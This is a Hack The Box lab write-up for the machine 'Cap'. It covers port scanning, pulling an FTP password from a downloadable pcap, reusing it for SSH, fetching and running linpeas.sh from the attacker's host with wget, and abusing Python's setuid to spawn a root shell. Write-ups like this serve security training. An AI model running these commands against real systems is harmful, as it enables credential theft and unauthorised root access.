# HTB - Cap

**IP Address:** `10.10.10.245`  
**OS:** Ubuntu 20.04  
**Difficulty:** Easy  
**Tags:** #FTP, #PCAP, #Wireshark, #SSH, #LinPEAS, #SUID, #Python

---
## 1. Port Scanning

### 1.1 Nmap Scan

```bash
# Command
nmap -sV -sC 10.10.10.245
```

``` bash
# Output
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 19:38 UTC
Nmap scan report for 10.10.10.245
Host is up (0.036s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                        
| ssh-hostkey:                                                                   
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)                   
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)                  
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
```

---
## 2. Web Enumeration

Navigating to `http://10.10.10.245` opens a "Security Dashboard" already logged in as `Nathan`. 

![Main Dashboard](website_with_lateral_menu.png)

Clicking **Security Snapshot** changes the URL to `/capture/data/0`.

![Main Dashboard](dashboard_security_snapshot.png)

```text
/capture/data/0 → contains downloadable PCAP data
```

⬇️ Downloaded the `.pcap` file and opened it with **Wireshark**.

Filtered traffic by protocol **FTP** and discovered:

![Main Dashboard](wireshark.png)

```text
Username: nathan
Password: Buck3tH4TF0RM3!
```

---
## 3. SSH Access

Used the recovered credentials:

```bash
ssh nathan@10.10.10.245
```

✅ SSH login successful  
🏁 **User flag retrieved from Nathan's home directory**

---
## 4. Privilege Escalation

### 4.1 Hosting linPEAS Locally

Started a local web server:

```bash
python3 -m http.server 8080
```

On victim machine, downloaded **linpeas.sh**:

```bash
wget http://10.10.14.105:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![Main Dashboard](nathan_user.png)

---
### 4.2 Root via Python SUID Abuse

`linpeas.sh` showed a possible misconfigured **SUID bit on Python3**.

On the victim:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

![Main Dashboard](escalation.png)

✅ Spawned a root shell  
🏁 **Root flag retrieved from `/root`**

---
# ✅ MACHINE COMPLETE
